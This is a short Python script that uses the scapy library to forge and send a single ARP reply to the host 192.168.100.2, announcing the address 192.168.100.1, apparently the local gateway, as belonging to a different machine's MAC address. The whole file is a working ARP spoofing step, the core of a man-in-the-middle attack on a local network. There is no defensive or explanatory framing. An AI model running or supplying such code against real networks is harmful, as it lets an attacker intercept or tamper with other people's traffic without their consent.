import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="192.168.100.2", hwdst="30:84:54:18:40:9d", psrc="192.168.100.1")
# print(packet.show())
# print(packet.summary())

#send the packet
scapy.send(packet)
